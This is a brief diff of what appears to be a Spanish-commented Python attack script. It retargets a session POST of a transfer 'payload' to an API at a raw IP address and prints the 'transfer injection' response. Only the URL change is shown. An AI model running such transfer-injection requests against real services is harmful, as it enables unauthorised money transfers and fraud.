@@ -33,7 +33,7 @@ session.headers.update({
 })
 
 # === Enviar la transferencia ===
-transfer_url = "http://80.78.30.242:9181/api/send-transfer"
+transfer_url = "http://80.78.30.242:9181/api/transferencia/"
 xfer_response = session.post(transfer_url, json=payload)
 
 print("[+] Respuesta de inyección de transferencia:")
